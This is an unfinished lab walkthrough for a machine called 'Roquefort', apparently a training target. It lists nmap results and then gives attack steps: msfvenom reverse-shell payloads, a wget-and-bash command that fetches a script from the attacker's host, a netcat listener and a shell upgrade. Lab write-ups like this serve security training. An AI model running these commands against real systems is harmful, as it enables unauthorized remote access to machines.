# Roquefort (WIP)

## Nmap

```
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5b
22/tcp   open   ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
53/tcp   closed domain
2222/tcp open   ssh     Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open   ppp?
```

## HTTP

{% embed url="https://www.exploit-db.com/exploits/49383" %}

msfvenom:

```
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.49.196 LPORT=2222 -f raw > shell.sh
```



Host on:

```
sudo python2 -m SimpleHTTPServer 21
```

First run:

```
USERNAME = "test"
PASSWORD = "Password"
HOST_ADDR = '192.168.49.196'
HOST_PORT = 3000
URL = 'http://192.168.196.67:3000'                                                                                                                                                                          
CMD = 'wget http://192.168.49.196:21/shell.sh && bash shell.sh' 
```

Listener:

```
sudo nc -lvp 2222
```

A shell should establish on our listener.

![](<../../.gitbook/assets/image (797).png>)

upgrade the shell.

```
/usr/bin/script -qc /bin/bash /dev/null
```

```
msfvenom -p linux/x64/shell_reverse_tcp RHOST=192.168.49.196 LPORT=2222 -f elf > run-parts
```
